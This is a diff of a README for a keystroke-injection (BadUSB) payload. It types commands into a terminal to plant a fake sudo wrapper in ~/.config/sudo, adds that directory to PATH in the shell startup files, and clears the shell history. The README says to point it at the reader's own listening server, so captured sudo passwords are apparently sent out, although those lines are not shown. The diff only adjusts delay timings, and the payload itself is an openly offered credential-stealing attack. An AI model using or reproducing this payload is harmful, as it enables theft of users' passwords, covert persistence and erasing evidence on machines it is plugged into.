@@ -1,22 +1,22 @@
 Change `example.com` to your listening server address and `1337` to your own port of choice.
 
 ```
-DELAY 2000
+DELAY 2010
 GUI SPACE
-DELAY 500
+DELAY 600
 ALT F2
-DELAY 500
+DELAY 600
 DEL
-DELAY 100
+DELAY 200
 STRING terminal
 ENTER
 DELAY 3000
 STRING rm -rf ~/.config/sudo
 ENTER
-DELAY 100
+DELAY 200
 STRING mkdir -p ~/.config/sudo
 ENTER
-DELAY 100
+DELAY 200
 STRING echo '#!'$SHELL > ~/.config/sudo/sudo
 ENTER
 STRING /usr/bin/sudo -n true 2>/dev/null
@@ -57,19 +57,19 @@ STRING fi
 ENTER
 STRING fi' > ~/.config/sudo/sudo
 ENTER
-DELAY 100
+DELAY 200
 STRING chmod u+x ~/.config/sudo/sudo
 ENTER
-DELAY 100
+DELAY 200
 STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
 ENTER
-DELAY 100
+DELAY 200
 STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
 ENTER
-DELAY 100
+DELAY 200
 STRING history -c && rm .bash_history && exit
 ENTER
-DELAY 400
+DELAY 600
 GUI q
 ```
 
